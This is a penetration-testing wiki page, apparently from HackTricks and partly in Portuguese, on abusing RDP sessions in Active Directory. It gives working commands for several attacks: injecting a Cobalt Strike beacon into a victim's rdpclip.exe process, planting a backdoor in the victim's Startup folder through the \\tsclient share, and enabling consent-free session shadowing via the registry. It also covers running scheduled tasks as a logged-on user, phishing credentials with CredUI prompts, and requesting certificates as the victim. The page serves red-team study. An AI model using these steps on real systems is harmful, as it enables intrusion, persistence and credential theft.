# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se o **external group** tiver **RDP access** a qualquer **computer** no domínio atual, um **attacker** poderia **compromise that computer and wait for him**.

Uma vez que that user tenha acessado via RDP, o **attacker can pivot to that users session** e abusar de suas permissões no external domain.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **outras maneiras de roubar sessões com outras ferramentas** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se um usuário acessar via **RDP into a machine** onde um **attacker** está **waiting** por ele, o attacker será capaz de **inject a beacon in the RDP session of the user** e se a **victim mounted his drive** ao acessar via RDP, o **attacker could access it**.

Nesse caso você poderia simplesmente **compromise** o **victims** **original computer** escrevendo um **backdoor** na **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se você for **local admin** em um host onde a vítima já tem uma **active RDP session**, pode conseguir **view/control that desktop without stealing the password or dumping LSASS**.

Isto depende da política **Remote Desktop Services shadowing** armazenada em:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valores interessantes:

- `0`: Desativado
- `1`: `EnableInputNotify` (controle, aprovação do usuário necessária)
- `2`: `EnableInputNoNotify` (controle, **sem aprovação do usuário**)
- `3`: `EnableNoInputNotify` (somente visualização, aprovação do usuário necessária)
- `4`: `EnableNoInputNoNotify` (somente visualização, **sem aprovação do usuário**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Isso é especialmente útil quando um usuário privilegiado conectado por RDP deixou a área de trabalho desbloqueada, uma sessão do KeePass, o console MMC, uma sessão do navegador ou um admin shell abertos.

## Tarefas Agendadas como Usuário Conectado

Se você for **local admin** e o usuário alvo estiver **atualmente conectado**, o Task Scheduler pode iniciar código **como esse usuário sem a sua senha**.

Isso transforma a sessão de logon existente da vítima em um primitivo de execução:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.

## CredUI Prompt Abuse From the Victim Session

Uma vez que você possa executar **dentro da área de trabalho interativa da vítima** (por exemplo via **Shadow RDP** ou **a scheduled task running as that user**), você pode exibir um **real Windows credential prompt** usando as APIs CredUI e coletar as credenciais inseridas pela vítima.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Inicie um binário na sessão da vítima.
2. Exiba um prompt de autenticação de domínio que corresponda ao branding do domínio atual.
3. Desempacote o buffer de autenticação retornado.
4. Valide as credenciais fornecidas e, opcionalmente, continue solicitando até que credenciais válidas sejam inseridas.

Isto é útil para **on-host phishing** porque o prompt é renderizado por APIs padrão do Windows em vez de um formulário HTML falso.

## Requesting a PFX In the Victim Context

O mesmo primitivo **scheduled-task-as-user** pode ser usado para solicitar um certificado/PFX como o usuário logado. Esse certificado pode mais tarde ser usado para **AD authentication** como esse usuário, evitando totalmente o roubo de senha.

High-level flow:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
